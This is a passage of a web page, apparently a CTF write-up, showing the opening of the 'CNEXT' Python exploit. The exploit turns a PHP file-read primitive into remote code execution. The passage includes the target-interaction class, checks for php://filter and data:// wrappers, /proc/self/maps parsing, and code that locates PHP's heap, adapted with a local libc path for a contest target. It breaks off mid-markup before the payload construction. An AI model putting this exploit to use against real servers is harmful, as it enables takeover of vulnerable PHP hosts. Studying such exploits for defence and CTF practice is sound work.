class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># REQUIREMENTS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Requires ten: https://github.com/cfreal/ten</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ChunkedEncodingError, ConnectionError<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url, data=&#123;<span class="hljs-string">&quot;pdo&quot;</span>: path&#125;)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;File contents: (.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> base64.decode(data)<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep_time&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.remote = Remote(<span class="hljs-variable language_">self</span>.url)<br>        <span class="hljs-variable language_">self</span>.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.info = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.heap = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        result = safe_download(path)<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;maps&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            maps = f.read()<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> := PATTERN.<span class="hljs-keyword">match</span>(region):<br>                start = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)<br>                path = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br>        <span class="hljs-built_in">print</span>(regions)<br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = <span class="hljs-variable language_">self</span>.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;F:\\zzzworkings\\CTF\\races\\JQCTF_final\\photocms\\exp\\libc-2.27.so&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;heap&quot;</span>] = <span class="hljs-variable language_">self</span>.heap <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = <span class="hljs-variable language_">self</span>._get_region(regions, <span class="hljs-string">&quot;libc-2&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        <span class="hljs-comment">#self.download_file(libc.path, LIBC_FILE)</span><br><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment">#self.info[&quot;libc&quot;] = ELF(&quot;libc-2.31.so&quot;, checksec=False)</span><br>        <span class="hljs-variable language_">self</span>.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = <span class="hljs-variable language_">self</span>.get_file(remote_path)<br>        <span class="hljs-comment">#print(data)</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(local_path,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(data)<br>        f.close()<br>        <span class="hljs-comment">#Path(local_path).write(data)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path == <span class="hljs-string">&quot;&quot;</span><br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment">#self.check_vulnerable()</span><br>        <span class="hljs-variable language_">self</span>.get_symbols_and_addresses()<br><br>        <span class="hljs-variable language_">self</span>.exploit()<br><br>    <span 